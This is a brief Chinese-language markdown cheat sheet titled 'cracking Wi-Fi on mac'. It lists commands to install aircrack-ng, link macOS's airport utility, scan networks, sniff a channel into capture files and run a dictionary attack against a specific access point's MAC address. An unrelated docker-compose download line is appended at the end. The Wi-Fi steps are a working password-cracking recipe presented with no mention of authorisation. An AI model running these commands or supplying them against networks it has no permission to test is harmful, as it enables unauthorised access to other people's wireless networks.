# mac 下破解Wi-Fi

* 安装`aircrack-ng`
* 创建airport连接
* sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
* `/airport -s` scan wifi
* `airport card sniff 信道`
* 破解 aircrack-ng -w password.txt -b c8:3a:35:30:3e:c8 /tmp/*.cap

sudo curl -L https://github.com/docker/compose/releases/download/1.17.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
